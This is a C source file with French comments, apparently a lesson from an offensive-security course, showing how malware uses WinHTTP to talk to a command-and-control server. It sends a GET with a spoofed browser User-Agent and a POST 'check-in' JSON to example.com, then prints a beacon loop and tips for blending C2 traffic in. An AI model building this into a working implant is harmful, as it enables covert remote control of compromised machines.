/*
 * OBJECTIF  : Client HTTP avec WinHTTP pour communication C2
 * PREREQUIS : HTTP basics, Windows API
 * COMPILE   : cl example.c /Fe:example.exe /link winhttp.lib
 *
 * WinHTTP est l'API Windows de choix pour les clients HTTP.
 * Plus bas niveau que WinInet, elle offre un controle fin
 * sur les requetes, headers, et la gestion du proxy.
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

void demo_http_get(void) {
    printf("[1] Requete HTTP GET avec WinHTTP\n\n");

    /* Etape 1 : Ouvrir une session WinHTTP */
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("    [-] WinHttpOpen echoue\n\n");
        return;
    }
    printf("    [+] Session ouverte (User-Agent personnalise)\n");

    /* Etape 2 : Connexion au serveur */
    HINTERNET hConnect = WinHttpConnect(hSession,
        L"www.example.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        printf("    [-] WinHttpConnect echoue\n\n");
        WinHttpCloseHandle(hSession);
        return;
    }
    printf("    [+] Connecte a www.example.com:80\n");

    /* Etape 3 : Creer la requete */
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"GET", L"/", NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("    [-] WinHttpOpenRequest echoue\n\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    /* Etape 4 : Ajouter des headers C2 */
    WinHttpAddRequestHeaders(hRequest,
        L"X-Request-ID: abc123\r\n", -1,
        WINHTTP_ADDREQ_FLAG_ADD);
    printf("    [+] Header X-Request-ID ajoute\n");

    /* Etape 5 : Envoyer la requete */
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        /* Lire le status code */
        DWORD statusCode = 0, size = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size,
            WINHTTP_NO_HEADER_INDEX);
        printf("    [+] Status: %lu\n", statusCode);

        /* Lire la reponse */
        char buf[1024] = {0};
        DWORD bytesRead = 0;
        WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &bytesRead);
        if (bytesRead > 0)
            printf("    [+] Recu %lu octets (debut: %.60s...)\n", bytesRead, buf);
    } else {
        printf("    [-] Requete echouee (erreur %lu)\n", GetLastError());
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    printf("\n");
}

void demo_http_post(void) {
    printf("[2] Requete HTTP POST (envoi de donnees C2)\n\n");

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { printf("    [-] Session echouee\n\n"); return; }

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"www.example.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        printf("    [-] Connect echoue\n\n");
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST", L"/api/checkin", NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        printf("    [-] OpenRequest echoue\n\n");
        return;
    }

    /* Corps de la requete POST (check-in JSON) */
    const char* body = "{\"type\":\"checkin\",\"pid\":1234,\"user\":\"admin\"}";
    DWORD bodyLen = (DWORD)strlen(body);

    printf("    [+] POST body: %s\n", body);
    printf("    [+] Content-Type: application/json\n");

    BOOL ok = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n", -1,
        (LPVOID)body, bodyLen, bodyLen, 0);
    if (ok) {
        ok = WinHttpReceiveResponse(hRequest, NULL);
        if (ok) {
            DWORD status = 0, sz = sizeof(status);
            WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz,
                WINHTTP_NO_HEADER_INDEX);
            printf("    [+] Reponse status: %lu\n", status);
        }
    }
    if (!ok)
        printf("    [-] POST echoue (erreur %lu)\n", GetLastError());

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    printf("\n");
}

void demo_c2_pattern(void) {
    printf("[3] Pattern C2 typique avec WinHTTP\n\n");
    printf("    Boucle C2 standard :\n");
    printf("    1. WinHttpOpen()         -> Session avec User-Agent credible\n");
    printf("    2. WinHttpConnect()      -> Connexion au serveur C2\n");
    printf("    3. WinHttpOpenRequest()  -> GET /api/tasks (poll)\n");
    printf("    4. WinHttpSendRequest()  -> Envoyer\n");
    printf("    5. WinHttpReceiveResponse() -> Recevoir les taches\n");
    printf("    6. Executer la commande\n");
    printf("    7. POST /api/results     -> Envoyer le resultat\n");
    printf("    8. Sleep(jitter)         -> Attendre\n");
    printf("    9. Goto 3\n\n");
    printf("    Headers utiles pour le C2 :\n");
    printf("    - User-Agent realiste (navigateur, OS)\n");
    printf("    - Cookie pour le session ID\n");
    printf("    - X-Forwarded-For pour simuler un proxy\n");
    printf("    - Content-Type: application/json ou octet-stream\n\n");
}

int main(void) {
    printf("[*] Demo : HTTP Client WinHTTP pour C2\n");
    printf("[*] ==========================================\n\n");
    demo_http_get();
    demo_http_post();
    demo_c2_pattern();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
